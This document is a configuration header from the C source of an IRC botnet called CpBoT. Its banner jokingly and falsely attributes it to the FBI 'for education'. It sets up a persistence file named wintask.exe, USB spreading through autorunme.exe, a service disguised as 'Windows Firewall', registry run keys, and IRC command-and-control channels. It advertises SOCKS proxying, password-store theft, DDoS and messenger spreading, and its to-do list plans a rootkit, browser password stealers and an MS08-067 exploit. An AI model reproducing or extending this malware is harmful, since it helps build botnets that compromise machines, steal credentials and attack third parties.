//|				_________       __________     ___________		   |\\
//|				\_   ___ \______\______   \ ___\__    ___/		   |\\
//|				/    \  \/\____ \|    |  _//  _ \|    |			   |\\
//|				\     \___|  |_> >    |   (  <_> )    |			   |\\
//|				 \______  /   __/|______  /\____/|____|			   |\\
//|						\/|__|          \/						   |\\
//|																   |\\
//|			  Coded by the FBI for Education Purposes ONLY         |\\
//|----------------------------------------------------------------|\\
//|					 » CpBoT 0.1 Public Release «				   |\\
//| [RAR|P2P|TRITON|MSN|AIM|USB|SOCKS4|PSTORE|DDOS|VISIT|SERVICE]  |\\
//|----------------------------------------------------------------|\\
// ToDo: 
// Add Mail Spread.
// Remove fu driver and service thing.
// Add Rootkit or process inject.
// Add Firefox/FlashFXP Pass Stealers.
// Add httpd/ftpd server.
// Add Yahoo/ICQ spread with Yahoo/ICQ API.
// Port/Add MS08-067 Exploit and Scanner.

//					 [·O· » CpBoT Configuration « ·O·]				//


char mutexhandle[]		= "xLULZx";			    // Mutex handle
char botid[]			= "CpBoT 0.1 by SWiM "; // Bot ID
unsigned short sock4port= 8069;					// Socks4 port
char prefix				= '-';					// Command prefix
char movepath[]			= "%windir%";			// Path to move to
char filename[]			= "wintask.exe";        // Bots Filename
char USB_STR_FILENAME[]	= "autorunme.exe";		// USB Filename
char USB_CHANNEL[]		= "#cP";			    // USB Chan
char version[]			= "1";					// Bot Version
char pstore_chan[]		= "#cP";				// Pstore Channel
BOOL staticftpd			= TRUE;			    	// Always use ftpdport for the ftpd port
char password[]			= "......";
char authhost1[] = "*!*@*";//*!*@*
char authhost2[] = "*!*@*";//*!*@*
char authhost3[] = "*!*@*";//*!*@*
char *authost[] = { authhost1, authhost2, authhost3 };

// Server Configuration

SERVER servers[]={
		{
			"127.0.0.1",					// Server to connect to
			"",						        	// Server Password
			1234,								// Server Port
			FALSE,								// Use SSL or not
			"#cP",								// Main Bot Channel
			"...",						       	// Channel Key
			"",									// Modes to set on connection
			"",									// Modes to set on joining Main Channel
			"#cP",								// Exploit Channel
			"#cP",								// Sniffer Channel
			"#cP"								// Warn Channel
		},
	};


#ifndef NO_MELT
	REGENT meltkey=	{ HKEY_LOCAL_MACHINE, "Windows", "Removal" };
#endif

#ifndef NO_SERVICE								// Bot to run as service
	char servicename[]		= "winserv";           // Service Name
	char servicedisplayname[]= "Windows Firewall";			// Service Display Name
	char servicedesc[]		= "Windows Firewall Service";			// Service Description
#else
	REGENT runkey = { HKEY_LOCAL_MACHINE, "Windows", "Security" };
#endif
